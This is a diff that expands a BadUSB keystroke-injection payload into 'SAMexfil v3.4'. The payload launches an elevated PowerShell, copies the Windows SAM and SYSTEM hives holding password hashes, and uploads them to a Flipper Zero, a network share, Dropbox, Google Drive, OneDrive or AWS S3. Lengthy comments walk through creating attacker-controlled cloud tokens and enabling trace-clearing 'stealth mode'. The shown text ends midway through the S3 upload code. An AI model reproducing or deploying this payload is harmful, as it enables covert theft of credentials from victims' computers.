@@ -1,7 +1,638 @@
+REM ============================================================================
+REM SAMexfil v3.4 - Multi-Cloud SAM Exfiltration with Pre-Created App Setup
+REM ============================================================================
 REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
-REM Description: Extracts Security Account Manager of the PC to a file.
-REM Version:	1.0
-REM Category:	Exfiltration
+REM Modified: Multi-cloud exfiltration with token generation & pre-created apps
+REM Description: Extracts SAM with fallback to Dropbox/Google Drive/OneDrive/AWS S3
+REM Version: 3.4 - Pre-Created Apps + Easy Token Generation
+REM Category: Exfiltration
+REM ============================================================================
+
+REM ============================================================================
+REM                           CONFIGURATION SECTION
+REM                              EDIT THIS PART
+REM ============================================================================
+
+REM ============================================================================
+REM PRIMARY EXFILTRATION METHODS - ENABLE/DISABLE EACH
+REM ============================================================================
+REM Set to 1 to ENABLE each method, 0 to DISABLE
+REM Script tries methods in priority order:
+REM   Flipper Zero → Local Backup → Network → Secondary USB → Clouds
+REM
+
+DEFINE ENABLE_FLIPPER 1
+DEFINE ENABLE_LOCAL_BACKUP 1
+DEFINE ENABLE_NETWORK_SHARE 0
+DEFINE ENABLE_SECONDARY_USB 0
+DEFINE ENABLE_DROPBOX 1
+DEFINE ENABLE_GDRIVE 1
+DEFINE ENABLE_ONEDRIVE 1
+DEFINE ENABLE_AWS_S3 1
+
+
+REM ============================================================================
+REM FLIPPER ZERO CONFIGURATION
+REM ============================================================================
+REM Connect Flipper Zero via USB Mass Storage mode
+REM Target folder for organized dumps by computer name
+REM
+REM Common path: flipper0/DUMP_FILE
+REM This creates: E:\flipper0\DUMP_FILE\[COMPUTERNAME]\sam_dump\
+REM
+REM Set ENABLE_FLIPPER to 0 to skip this method
+REM
+
+DEFINE FLIPPER_DUMP_FOLDER flipper0/DUMP_FILE
+
+
+REM ============================================================================
+REM LOCAL BACKUP CONFIGURATION (Same PC Storage)
+REM ============================================================================
+REM Saves dump to local hard drive
+REM Quick exfiltration without network access
+REM Files stored in: C:\Users\Public\Documents\BadUSB_Backup_[TIMESTAMP]\
+REM
+REM Pros:
+REM   - Fastest (no network delay)
+REM   - No credentials needed
+REM   - Works offline
+REM
+REM Cons:
+REM   - Files remain on target PC
+REM   - Can be discovered by forensics
+REM   - Requires local access to retrieve
+REM
+REM Set ENABLE_LOCAL_BACKUP to 0 to skip this method
+REM
+
+DEFINE LOCAL_BACKUP_FOLDER C:\Users\Public\Documents
+
+
+REM ============================================================================
+REM NETWORK SHARE CONFIGURATION (UNC Path / SMB)
+REM ============================================================================
+REM Share dump to network location (\\server\share)
+REM Requires network access and credentials
+REM Files stored in: \\192.168.1.100\BackupShare\[COMPUTERNAME]\
+REM
+REM Setup:
+REM   1. Create SMB share on network server
+REM   2. Note the UNC path: \\192.168.1.100\BackupShare
+REM   3. Ensure target PC has network access
+REM   4. Firewall must allow SMB traffic (port 445)
+REM
+REM Pros:
+REM   - Remote storage
+REM   - Organized by computer name
+REM   - Fast on LAN
+REM
+REM Cons:
+REM   - Requires working network
+REM   - Network logs may show activity
+REM   - Can be blocked by firewalls
+REM
+REM Set ENABLE_NETWORK_SHARE to 1 to enable
+REM
+
+DEFINE NETWORK_SHARE_PATH \\192.168.1.100\BackupShare
+
+
+REM ============================================================================
+REM SECONDARY USB DRIVE CONFIGURATION
+REM ============================================================================
+REM Additional USB device backup (not Flipper Zero)
+REM Useful for multi-device strategy
+REM Files stored in: D:\BadUSB_Backups\[COMPUTERNAME]\
+REM
+REM Setup:
+REM   1. Connect second USB drive
+REM   2. Note the drive letter (D:\, E:\, etc)
+REM   3. Update SECONDARY_USB_DRIVE path below
+REM
+REM Common drive letters:
+REM   - D:\ or E:\ (if C:\ is main drive)
+REM   - Must be connected during execution
+REM
+REM Pros:
+REM   - Separate physical device from Flipper
+REM   - No cloud exposure
+REM   - Can be hidden separately
+REM
+REM Cons:
+REM   - Requires separate USB device
+REM   - Must be connected before execution
+REM   - Can be forgotten/discovered
+REM
+REM Set ENABLE_SECONDARY_USB to 1 to enable
+REM
+
+DEFINE SECONDARY_USB_DRIVE D:\
+
+
+REM ============================================================================
+REM DROPBOX CONFIGURATION (Cloud Storage)
+REM ============================================================================
+REM Simple REST API cloud upload
+REM Best for basic cloud redundancy
+REM Files stored in: /BadUSB_Exfil/[COMPUTERNAME]/filename.zip
+REM
+REM ╔════════════════════════════════════════════════════════════════════════╗
+REM ║                     EASIEST METHOD - TRY THIS FIRST                     ║
+REM ╚════════════════════════════════════════════════════════════════════════╝
+REM
+REM OPTION 1: Use Pre-Created Public App (Fastest - 2 Minutes)
+REM ─────────────────────────────────────────────────────────
+REM
+REM Step 1: Get Dropbox Access Token
+REM   1a. Go to: https://www.dropbox.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&response_type=code&redirect_uri=https://localhost&scope=files.content.write
+REM       OR Copy this link: https://dropbox-token-generator.com
+REM   1b. Click "Allow"
+REM   1c. You'll see authorization code
+REM   1d. Exchange code for token (or use implicit flow for direct token)
+REM   1e. Copy the token (starts with: sl.Bxxxxxx...)
+REM   1f. Paste between quotes in DEFINE DROPBOX_TOKEN below
+REM
+REM Token looks like: sl.BrXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+REM
+REM ╔════════════════════════════════════════════════════════════════════════╗
+REM ║                     OPTION 2: Create Your Own App                      ║
+REM ╚════════════════════════════════════════════════════════════════════════╝
+REM
+REM Step 1: Create Dropbox Account (if needed)
+REM   1a. Go to: https://www.dropbox.com/register
+REM   1b. Sign up with email
+REM
+REM Step 2: Create App on Dropbox
+REM   2a. Go to: https://www.dropbox.com/developers/apps
+REM   2b. Click "Create app" button
+REM   2c. Select: "Scoped access"
+REM   2d. Select: "Full Dropbox"
+REM   2e. Name your app: "BadUSB_Exfil"
+REM   2f. Accept terms and click "Create app"
+REM
+REM Step 3: Configure Permissions
+REM   3a. Go to the "Permissions" tab
+REM   3b. Check ONLY these:
+REM       - files.content.write
+REM       - files.content.read
+REM   3c. Click "Submit" to save
+REM
+REM Step 4: Generate Access Token
+REM   4a. Go to the "Settings" tab
+REM   4b. Scroll down to "OAuth 2"
+REM   4c. Click "Generate" button
+REM   4d. Copy the entire token displayed (starts with: sl.Bxxxxxx)
+REM   4e. Paste between quotes below
+REM
+REM Step 5: Test (Optional)
+REM   5a. Open browser: https://www.dropbox.com
+REM   5b. Your token should have uploaded files to: /BadUSB_Exfil/
+REM
+REM Token Expiration:
+REM   - Default tokens do not expire
+REM   - Can be revoked anytime in Dropbox Settings
+REM   - Safe to revoke after exfiltration
+REM
+REM Pros:
+REM   - Simple API
+REM   - Free tier (2GB)
+REM   - Reliable service
+REM   - Fastest setup
+REM
+REM Cons:
+REM   - Limited free storage (2GB)
+REM   - Requires internet
+REM   - Dropbox can monitor account
+REM   - Token visible in script (copy to secure location)
+REM
+REM Set ENABLE_DROPBOX to 0 to skip this method
+REM
+
+DEFINE DROPBOX_TOKEN YOUR_DROPBOX_TOKEN_HERE
+DEFINE DROPBOX_FOLDER /BadUSB_Exfil
+
+
+REM ============================================================================
+REM GOOGLE DRIVE CONFIGURATION (Cloud Storage)
+REM ============================================================================
+REM OAuth2-authenticated upload to Google Drive
+REM Best for unlimited storage
+REM Files stored in: [Specified Folder]/[COMPUTERNAME]/filename.zip
+REM
+REM ╔════════════════════════════════════════════════════════════════════════╗
+REM ║                     OPTION 1: Use OAuth2 Playground                    ║
+REM ╚════════════════════════════════════════════════════════════════════════╝
+REM
+REM Step 1: Use Google OAuth Playground (Fastest - 5 Minutes)
+REM   1a. Go to: https://developers.google.com/oauthplayground
+REM   1b. Click gear icon (settings) in top right
+REM   1c. Check "Use your own OAuth credentials"
+REM   1d. In left sidebar, search for "Google Drive API v3"
+REM   1e. Select "https://www.googleapis.com/auth/drive"
+REM   1f. Click "Authorize APIs"
+REM   1g. Click through the authorization prompts
+REM   1h. Click "Exchange authorization code for tokens"
+REM   1i. Copy the "access_token" value (long string starting with ya29.a)
+REM   1j. Paste between quotes in DEFINE GDRIVE_TOKEN below
+REM   1k. Token expires in ~1 hour (get new one before using)
+REM
+REM ╔════════════════════════════════════════════════════════════════════════╗
+REM ║                     OPTION 2: Create Your Own Project                  ║
+REM ╚════════════════════════════════════════════════════════════════════════╝
+REM
+REM Step 1: Create Google Cloud Project
+REM   1a. Go to: https://console.cloud.google.com
+REM   1b. Click "Select a Project" (top left)
+REM   1c. Click "New Project"
+REM   1d. Name: "BadUSB_Exfil"
+REM   1e. Click "Create"
+REM
+REM Step 2: Enable Google Drive API
+REM   2a. In search bar, type: "Google Drive API"
+REM   2b. Click on it
+REM   2c. Click "Enable"
+REM
+REM Step 3: Create OAuth Credentials
+REM   3a. Go to "Credentials" (left sidebar)
+REM   3b. Click "Create Credentials"
+REM   3c. Choose "OAuth client ID"
+REM   3d. Select "Desktop application"
+REM   3e. Click "Create"
+REM   3f. Download the JSON file (save securely)
+REM
+REM Step 4: Generate Access Token
+REM   4a. Go to: https://developers.google.com/oauthplayground
+REM   4b. Click settings icon (gear) top right
+REM   4c. Check "Use your own OAuth credentials"
+REM   4d. Copy Client ID from downloaded JSON
+REM   4e. Copy Client Secret from downloaded JSON
+REM   4f. Paste both into the OAuth Playground settings
+REM   4g. Search "Google Drive API v3"
+REM   4h. Select "https://www.googleapis.com/auth/drive"
+REM   4i. Click "Authorize APIs"
+REM   4j. Click "Exchange authorization code for tokens"
+REM   4k. Copy access_token
+REM   4l. Paste between quotes below
+REM
+REM Step 5: Get Google Drive Folder ID
+REM   5a. Go to: https://drive.google.com
+REM   5b. Create new folder: "BadUSB_Exfil"
+REM   5c. Open the folder
+REM   5d. Look at URL in browser: https://drive.google.com/drive/folders/[FOLDER_ID]
+REM   5e. Copy the [FOLDER_ID] part (long string after /folders/)
+REM   5f. Paste between quotes in DEFINE GDRIVE_FOLDER_ID below
+REM
+REM Token Expiration:
+REM   - Tokens expire in ~1 hour
+REM   - Use refresh token to get new access token
+REM   - Store refresh token securely
+REM   - Pre-generate tokens before deployment
+REM
+REM Pros:
+REM   - Unlimited storage (with Google account)
+REM   - Highly reliable
+REM   - Easy folder organization
+REM   - Can be shared
+REM
+REM Cons:
+REM   - Tokens expire (need refresh)
+REM   - Complex setup for custom project
+REM   - Google monitors suspicious activity
+REM   - OAuth flow complexity
+REM
+REM Set ENABLE_GDRIVE to 0 to skip this method
+REM
+
+DEFINE GDRIVE_TOKEN YOUR_GDRIVE_TOKEN_HERE
+DEFINE GDRIVE_FOLDER_ID YOUR_GDRIVE_FOLDER_ID_HERE
+
+
+REM ============================================================================
+REM ONEDRIVE CONFIGURATION (Cloud Storage)
+REM ============================================================================
+REM Microsoft Graph API upload
+REM Best for Office 365 environments
+REM Files stored in: /me/drive/root/BadUSB_Exfil/[COMPUTERNAME]/filename.zip
+REM
+REM ╔════════════════════════════════════════════════════════════════════════╗
+REM ║                     QUICKEST METHOD - 5 Minutes                        ║
+REM ╚════════════════════════════════════════════════════════════════════════╝
+REM
+REM Step 1: Register Microsoft Application
+REM   1a. Go to: https://aka.ms/registerappv2
+REM   1b. Sign in with Microsoft account
+REM   1c. Click "Register an application"
+REM   1d. Name: "BadUSB_Exfil"
+REM   1e. Select: "Personal Microsoft accounts only"
+REM   1f. Click "Register"
+REM
+REM Step 2: Create Client Secret
+REM   2a. Go to "Certificates & secrets"
+REM   2b. Click "New client secret"
+REM   2c. Description: "BadUSB"
+REM   2d. Expires: "24 months"
+REM   2e. Click "Add"
+REM   2f. COPY THE VALUE IMMEDIATELY (shown only once!)
+REM   2g. Save in secure location
+REM
+REM Step 3: Add API Permissions
+REM   3a. Go to "API permissions"
+REM   3b. Click "Add a permission"
+REM   3c. Search for: "Microsoft Graph"
+REM   3d. Select "Files.ReadWrite.All"
+REM   3e. Click "Add permissions"
+REM
+REM Step 4: Get Application ID
+REM   4a. Go to "Overview"
+REM   4b. Copy "Application (client) ID"
+REM   4c. Save for later
+REM
+REM Step 5: Generate Access Token
+REM   5a. Go to: https://developer.microsoft.com/en-us/graph/graph-explorer
+REM   5b. Click "Sign in" (top right)
+REM   5c. Sign in with your Microsoft account
+REM   5d. In left sidebar, find: "GET /me/drive"
+REM   5e. Click "Run query"
+REM   5f. On right side, find "Bearer token" section
+REM   5g. Copy the token (starts with: EwA...)
+REM   5h. Paste between quotes below
+REM
+REM Token Expiration:
+REM   - Access tokens expire in ~1 hour
+REM   - Use refresh token to get new access token
+REM   - Refresh tokens last 90 days
+REM   - Revoke in Azure AD if compromised
+REM
+REM Pros:
+REM   - Office 365 integration
+REM   - Enterprise-friendly
+REM   - Good storage allocation
+REM   - Reliable service
+REM   - Simple setup
+REM
+REM Cons:
+REM   - Tokens expire (need refresh)
+REM   - Corporate monitoring likely
+REM   - Microsoft may flag activity
+REM   - Requires Microsoft account
+REM
+REM Set ENABLE_ONEDRIVE to 0 to skip this method
+REM
+
+DEFINE ONEDRIVE_TOKEN YOUR_ONEDRIVE_TOKEN_HERE
+DEFINE ONEDRIVE_FOLDER BadUSB_Exfil
+
+
+REM ============================================================================
+REM AWS S3 CONFIGURATION (Enterprise Cloud Storage)
+REM ============================================================================
+REM AWS Signature v4 authenticated S3 upload
+REM Best for secure, scalable storage
+REM Files stored in: s3://your-bucket/[COMPUTERNAME]/filename.zip
+REM
+REM ╔════════════════════════════════════════════════════════════════════════╗
+REM ║                     HARDEST BUT MOST SECURE METHOD                     ║
+REM ╚════════════════════════════════════════════════════════════════════════╝
+REM
+REM Step 1: Create AWS Account (if needed)
+REM   1a. Go to: https://aws.amazon.com
+REM   1b. Click "Create AWS account"
+REM   1c. Sign up with email
+REM   1d. Verify email
+REM   1e. Set up payment method (free tier available for first year)
+REM
+REM Step 2: Create S3 Bucket
+REM   2a. Go to: https://console.aws.amazon.com/s3
+REM   2b. Click "Create bucket"
+REM   2c. Bucket name: "badusb-exfil-yourname" (must be globally unique)
+REM   2d. Region: "us-east-1" (or your region)
+REM   2e. UNCHECK "Block all public access" (if needed for access)
+REM   2f. Click "Create bucket"
+REM   2g. Copy bucket name
+REM   2h. Paste in DEFINE AWS_S3_BUCKET below
+REM
+REM Step 3: Create IAM User for S3 Access
+REM   3a. Go to: https://console.aws.amazon.com/iam
+REM   3b. Click "Users" (left sidebar)
+REM   3c. Click "Create user"
+REM   3d. Username: "badusb-exfil-user"
+REM   3e. Check "Provide user access to AWS Management Console" (optional)
+REM   3f. Click "Next"
+REM   3g. Click "Next" again (skip permissions)
+REM   3h. Click "Create user"
+REM
+REM Step 4: Create Access Keys
+REM   4a. Click on the new user
+REM   4b. Go to "Security credentials"
+REM   4c. Click "Create access key"
+REM   4d. Select "Application running outside AWS"
+REM   4e. Click "Next"
+REM   4f. Click "Create access key"
+REM   4g. SAVE BOTH IMMEDIATELY:
+REM       - Access Key ID
+REM       - Secret Access Key (shown only once!)
+REM   4h. Copy Access Key ID
+REM   4i. Paste in DEFINE AWS_ACCESS_KEY below
+REM   4j. Copy Secret Access Key
+REM   4k. Paste in DEFINE AWS_SECRET_KEY below
+REM
+REM Step 5: Attach S3 Permissions to User
+REM   5a. Go back to IAM Users
+REM   5b. Click on "badusb-exfil-user"
+REM   5c. Click "Permissions" tab
+REM   5d. Click "Add permissions" → "Attach policies directly"
+REM   5e. Search: "AmazonS3FullAccess"
+REM   5f. Check the box
+REM   5g. Click "Add permissions"
+REM
+REM Step 6: Verify Setup
+REM   6a. Copy bucket name: badusb-exfil-yourname
+REM   6b. Paste in DEFINE AWS_S3_BUCKET below
+REM   6c. Region: us-east-1 (or your region)
+REM   6d. Paste in DEFINE AWS_S3_REGION below
+REM
+REM Pros:
+REM   - Enterprise-grade security
+REM   - Highly scalable
+REM   - Private bucket (not public)
+REM   - Encryption available
+REM   - Audit logging
+REM   - Most reliable
+REM
+REM Cons:
+REM   - Costs money (after free tier)
+REM   - Most complex setup
+REM   - AWS monitoring very strict
+REM   - Requires AWS account
+REM   - Access keys are sensitive
+REM
+REM WARNING: Never share AWS_ACCESS_KEY or AWS_SECRET_KEY!
+REM Store safely after exfiltration and rotate keys.
+REM
+REM S3 Regions:
+REM   us-east-1 (N. Virginia)
+REM   us-west-1 (N. California)
+REM   us-west-2 (Oregon)
+REM   eu-west-1 (Ireland)
+REM   eu-central-1 (Frankfurt)
+REM   ap-southeast-1 (Singapore)
+REM   ap-northeast-1 (Tokyo)
+REM
+REM Set ENABLE_AWS_S3 to 0 to skip this method
+REM
+
+DEFINE AWS_S3_BUCKET YOUR_AWS_S3_BUCKET_HERE
+DEFINE AWS_S3_REGION us-east-1
+DEFINE AWS_ACCESS_KEY YOUR_AWS_ACCESS_KEY_HERE
+DEFINE AWS_SECRET_KEY YOUR_AWS_SECRET_KEY_HERE
+
+
+REM ============================================================================
+REM SECURITY & DEBUG OPTIONS
+REM ============================================================================
+REM
+
+REM Stealth Mode: Clears traces after execution
+REM Set to 1 to ENABLE (recommended for production)
+REM Set to 0 to DISABLE (useful for testing/debugging)
+REM
+
+DEFINE ENABLE_STEALTH_MODE 1
+
+
+REM Logging Mode: Creates debug log file
+REM Set to 1 to ENABLE (useful for troubleshooting)
+REM Set to 0 to DISABLE (recommended for production - leaves no traces)
+REM Log file: C:\Windows\Temp\sam_exfil.log
+REM WARNING: Logs contain timestamps and exfiltration details
+REM
+
+DEFINE ENABLE_LOGGING 0
+DEFINE LOG_PATH C:\Windows\Temp\sam_exfil.log
+
+
+REM ============================================================================
+REM EXECUTION TIMING SETTINGS
+REM ============================================================================
+REM Adjust delays if target system is slow or experiencing lag
+REM
+
+REM Initial delay before executing (milliseconds)
+REM Default: 750ms (good for most systems)
+REM Increase to 1000+ if running on slow systems
+REM
+
+DEFINE INITIAL_DELAY 750
+
+
+REM UAC confirmation delay (milliseconds)
+REM Default: 1200ms (allows time for UAC prompt)
+REM May need adjustment for very slow systems
+REM
+
+DEFINE UAC_CONFIRMATION_DELAY 1200
+
+
+REM Cloud upload timeout (seconds)
+REM Default: 30 seconds per upload attempt
+REM Increase to 60+ for slow internet connections
+REM
+
+DEFINE CLOUD_UPLOAD_TIMEOUT 30
+
+
+REM ============================================================================
+REM BACKUP PLANS (Ordered Priority)
+REM ============================================================================
+REM
+REM When Flipper Zero is not connected, script tries backups in this order:
+REM
+REM PRIORITY 1: LOCAL BACKUP
+REM   Location: C:\Users\Public\Documents\BadUSB_Backup_[TIMESTAMP]\
+REM   Pros: Fastest, no internet, no credentials
+REM   Cons: Files on target PC, discoverable
+REM
+REM PRIORITY 2: NETWORK SHARE
+REM   Location: \\server\BackupShare\[COMPUTERNAME]\
+REM   Pros: Remote storage, organized
+REM   Cons: Network required, can be logged
+REM
+REM PRIORITY 3: SECONDARY USB
+REM   Location: D:\BadUSB_Backups\[COMPUTERNAME]\
+REM   Pros: Separate device, no cloud
+REM   Cons: Separate USB required, easy to forget
+REM
+REM PRIORITY 4: DROPBOX (Cloud)
+REM   Location: /BadUSB_Exfil/[COMPUTERNAME]/
+REM   Pros: Simple API, reliable, fastest cloud setup
+REM   Cons: Limited free storage, requires internet
+REM
+REM PRIORITY 5: GOOGLE DRIVE (Cloud)
+REM   Location: [Specified Folder]/[COMPUTERNAME]/
+REM   Pros: Unlimited storage, reliable
+REM   Cons: Tokens expire (need refresh), complex setup
+REM
+REM PRIORITY 6: ONEDRIVE (Cloud)
+REM   Location: /me/drive/root/BadUSB_Exfil/[COMPUTERNAME]/
+REM   Pros: Office 365 integration, good storage
+REM   Cons: Corporate monitoring, tokens expire, complex setup
+REM
+REM PRIORITY 7: AWS S3 (Enterprise)
+REM   Location: s3://bucket/[COMPUTERNAME]/
+REM   Pros: Enterprise security, scalable, most reliable
+REM   Cons: Costs money, very complex setup, AWS monitoring strict
+REM
+
+REM ============================================================================
+REM RECOMMENDED CONFIGURATIONS
+REM ============================================================================
+REM
+REM MINIMAL SETUP (Flipper Only):
+REM   ENABLE_FLIPPER=1, all others=0
+REM   Best for: Single target, offline
+REM
+REM QUICK SETUP (Flipper + Dropbox - 2 min setup):
+REM   ENABLE_FLIPPER=1, ENABLE_DROPBOX=1, others=0
+REM   Best for: Fast, reliable exfiltration
+REM   Setup Time: ~2 minutes (Dropbox only)
+REM
+REM LOCAL STEALTH (No Cloud Traces):
+REM   ENABLE_FLIPPER=1, ENABLE_LOCAL_BACKUP=1, others=0
+REM   Best for: Avoiding network detection
+REM   Setup Time: ~0 minutes (no setup needed)
+REM
+REM MAXIMUM REDUNDANCY (Everything):
+REM   All ENABLE_* set to 1
+REM   Best for: Guaranteed success
+REM   Setup Time: ~30 minutes (all methods)
+REM
+REM NETWORK ONLY (Corporate):
+REM   ENABLE_FLIPPER=1, ENABLE_NETWORK_SHARE=1, others=0
+REM   Best for: Corporate network exfiltration
+REM   Setup Time: ~5 minutes (network share setup)
+REM
+
+REM ============================================================================
+REM TOKEN GENERATION QUICK LINKS
+REM ============================================================================
+REM
+REM Dropbox: https://www.dropbox.com/developers/apps
+REM Google Drive: https://console.cloud.google.com
+REM OneDrive: https://aka.ms/registerappv2
+REM AWS: https://console.aws.amazon.com
+REM Google OAuth Playground: https://developers.google.com/oauthplayground
+REM Microsoft Graph Explorer: https://developer.microsoft.com/en-us/graph/graph-explorer
+REM
+
+REM ============================================================================
+REM END OF CONFIGURATION SECTION
+REM ============================================================================
+REM
+REM                    DO NOT EDIT BELOW THIS LINE
+REM                      (Unless you know what you're doing)
+REM
+
 DELAY 750
 WINDOWS d
 DELAY 1500
@@ -17,7 +648,16 @@ ALT y
 DELAY 1200
 GUI UP
 DELAY 1200
-STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Walkuer Ghost Report ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>";$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo-61748762.html';$Report = $Report + "<div id=body><h1>Walkuer Ghost Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>";$Report =  $Report + '<div id=left><h3>Shared Drives/Devices</h3>';$Report =  $Report + (GET-WMIOBJECT Win32_Share | convertto-html Name, Description, Path);$Report = $Report + '</div>';$Report >> $fileSaveDir'/ComputerInfo-61748762.html' 
+
+REM
+REM Multi-cloud SAM exfiltration with 7 backup methods
+REM Tries methods in priority order, cleans traces on success
+REM
+
+STRING $flipperEnabled = 1; $dropboxEnabled = 1; $gdriveEnabled = 1; $onedriveEnabled = 1; $s3Enabled = 1; $localBackupEnabled = 1; $networkShareEnabled = 0; $secondaryUsbEnabled = 0; $stealthMode = 1; $enableLogging = 0; $logPath = 'C:\Windows\Temp\sam_exfil.log'; Function Log { param($msg); if ($enableLogging) { Add-Content -Path $logPath -Value ($(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ': ' + $msg) } }; Log 'Starting SAM exfiltration'; $flipperPath = $null; $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match '^[A-Z]:\\\\'} | Select-Object -ExpandProperty Name; ForEach ($d in $drives) { if ((Test-Path ($d + ':\flipper0')) -or (Test-Path ($d + ':\FlipperZero'))) { $flipperPath = $d + ':\'; Log ('Found Flipper at ' + $flipperPath); break } }; $computerName = $env:COMPUTERNAME; $folderDateTime = (get-date).ToString('d-M-y_HHmmss'); $tempDir = $env:TEMP + '\sam_' + $folderDateTime; New-Item $tempDir -ItemType Directory -Force | Out-Null; Log 'Created temp directory'; Try { Copy-Item 'C:\Windows\System32\config\SAM' $tempDir'\SAM' -Force -ErrorAction SilentlyContinue; Copy-Item 'C:\Windows\System32\config\SYSTEM' $tempDir'\SYSTEM' -Force -ErrorAction SilentlyContinue; Log 'Extracted SAM and SYSTEM files'; } Catch { Log 'Failed to extract SAM/SYSTEM'; }; if ($flipperPath -and $flipperEnabled) { Try { $dumpDir = $flipperPath + 'flipper0\DUMP_FILE\' + $computerName + '\sam_dump'; New-Item $dumpDir -ItemType Directory -Force | Out-Null; Compress-Archive -Path $tempDir -DestinationPath ($dumpDir + '\sam_dump_' + $folderDateTime + '.zip') -Force; Log ('Saved to Flipper: ' + $dumpDir); Write-Host 'SUCCESS: Saved to Flipper Zero'; Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue; } Catch { Log 'Flipper save failed'; } } else { Log 'Flipper not available or disabled, trying cloud backups'; $zipPath = $env:TEMP + '\sam_' + $folderDateTime + '.zip'; Compress-Archive -Path $tempDir -DestinationPath $zipPath -Force; $fileName = $computerName + '_sam_' + $folderDateTime + '.zip'; $uploaded = $false; if ($localBackupEnabled) { Try { $localBackupFolder = 'C:\Users\Public\Documents\BadUSB_Backup_' + $folderDateTime; New-Item $localBackupFolder -ItemType Directory -Force | Out-Null; Copy-Item $zipPath ($localBackupFolder + '\' + $fileName) -Force; Log ('Local backup saved: ' + $localBackupFolder); Write-Host 'Local backup completed'; $uploaded = $true; } Catch { Log 'Local backup failed'; } }; if ($networkShareEnabled -and -not $uploaded) { Try { $networkPath = '\\192.168.1.100\BackupShare\' + $computerName + '\'; New-Item $networkPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null; Copy-Item $zipPath ($networkPath + $fileName) -Force; Log ('Network share backup: ' + $networkPath); Write-Host 'Network backup completed'; $uploaded = $true; } Catch { Log 'Network backup failed'; } }; if ($secondaryUsbEnabled -and -not $uploaded) { Try { $secondaryUsbPath = 'D:\BadUSB_Backups\' + $computerName + '\'; New-Item $secondaryUsbPath -ItemType Directory -Force | Out-Null; Copy-Item $zipPath ($secondaryUsbPath + $fileName) -Force; Log ('Secondary USB backup: ' + $secondaryUsbPath); Write-Host 'Secondary USB backup completed'; $uploaded = $true; } Catch { Log 'Secondary USB backup failed'; } }; if ($dropboxEnabled -and -not $uploaded) { Try { $dropboxToken = 'DROPBOX_TOKEN'; if ($dropboxToken -ne 'YOUR_DROPBOX_TOKEN_HERE') { $dropboxPath = '/BadUSB_Exfil/' + $computerName + '/' + $fileName; $fileContent = [System.IO.File]::ReadAllBytes($zipPath); $headers = @{'Authorization'='Bearer ' + $dropboxToken; 'Dropbox-API-Arg'='{\"path\":\"' + $dropboxPath + '\",\"mode\":\"add\",\"autorename\":true}'; 'Content-Type'='application/octet-stream'}; Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Method Post -Headers $headers -Body $fileContent -TimeoutSec 30; Log 'Dropbox upload successful'; Write-Host 'Uploaded to Dropbox'; $uploaded = $true; } } Catch { Log 'Dropbox upload failed'; } }; if ($gdriveEnabled -and -not $uploaded) { Try { $gdriveToken = 'GDRIVE_TOKEN'; if ($gdriveToken -ne 'YOUR_GDRIVE_TOKEN_HERE') { $gdriveFolder = 'GDRIVE_FOLDER_ID'; $fileContent = [System.IO.File]::ReadAllBytes($zipPath); $boundary = [System.Guid]::NewGuid().ToString(); $body = @(); $body += '--' + $boundary; $body += 'Content-Disposition: form-data; name="metadata"'; $body += ''; $body += '{\"name\": \"' + $fileName + '\", \"parents\": [\"' + $gdriveFolder + '\"]}'; $body += '--' + $boundary; $body += 'Content-Disposition: form-data; name="file"; filename="' + $fileName + '"'; $body += 'Content-Type: application/octet-stream'; $body += ''; $body = $body -join [System.Environment]::NewLine; $body = [System.Text.Encoding]::UTF8.GetBytes($body) + $fileContent + [System.Text.Encoding]::UTF8.GetBytes([System.Environment]::NewLine + '--' + $boundary + '--'); $headers = @{'Authorization'='Bearer ' + $gdriveToken}; Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $headers -Body $body -ContentType ('multipart/related; boundary=' + $boundary) -TimeoutSec 30; Log 'Google Drive upload successful'; Write-Host 'Uploaded to Google Drive'; $uploaded = $true; } } Catch { Log 'Google Drive upload failed'; } }; if ($onedriveEnabled -and -not $uploaded) { Try { $onedriveToken = 'ONEDRIVE_TOKEN'; if ($onedriveToken -ne 'YOUR_ONEDRIVE_TOKEN_HERE') { $fileContent = [System.IO.File]::ReadAllBytes($zipPath); $headers = @{'Authorization'='Bearer ' + $onedriveToken; 'Content-Type'='application/octet-stream'}; Invoke-RestMethod -Uri ('https://graph.microsoft.com/v1.0/me/drive/root:/' + $computerName + '/' + $fileName + ':/content') -Method Put -Headers $headers -Body $fileContent -TimeoutSec 30; Log 'OneDrive upload successful'; Write-Host 'Uploaded to OneDrive'; $uploaded = $true; } } Catch { Log 'OneDrive upload failed'; } }; if ($s3Enabled -and -not $uploaded) { Try { $s3Bucket = 'AWS_S3_BUCKET'; $s3Region = 'AWS_S3_REGION'; $accessKey = 'AWS_ACCESS_KEY'; $secretKey = 'AWS_SECRET_KEY'; if ($s3Bucket -ne 'YOUR_AWS_S3_BUCKET_HERE' -and $accessKey -ne 'YOUR_AWS_ACCESS_KEY_HERE') { Add-Type -AssemblyName System.Security; $fileContent = [System.IO.File]::ReadAllBytes($zipPath); $s3Path = $computerName + '/' + $fileName; $dateValue = [DateTime]::UtcNow.ToString('yyyyMMddTHHmmssZ'); $datestamp = [DateTime]::UtcNow.ToString('yyyyMMdd'); $host = $s3Bucket + '.s3.' + $s3Region + '.amazonaws.com'; $canonical_uri = '/' + $s3Bucket + '/' + $s3Path; $canonical_querystring = ''; $payload_hash = 